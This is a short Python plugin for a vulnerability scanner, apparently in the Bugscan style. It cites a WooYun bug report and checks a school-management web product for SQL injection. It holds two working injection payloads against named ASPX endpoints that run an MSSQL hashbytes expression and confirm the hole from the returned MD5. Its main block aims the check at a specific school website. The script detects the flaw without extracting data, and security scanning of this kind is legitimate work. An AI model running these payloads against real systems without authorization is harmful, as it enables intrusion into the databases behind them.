#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://www.wooyun.org/bugs/wooyun-2014-084572

def assign(service, arg):
    if service == "xinzuobiao":
        return True, arg
        
def audit(arg):
    payloads = ["/DPMA/FWeb/SPEWeb/Web5/SPEPhotosDetail.aspx?KindSetID=20010&ALBUMID=2011+and+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--",
    "/DPMA/FWeb/WorkRoomWeb/Web/TeacherPhotosDetail.aspx?TID=3050010135+AND+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--&Album_ID=1075"]
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, _ = curl.curl2(url)
        if '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('xinzuobiao', 'http://www.azxx.net/')[1])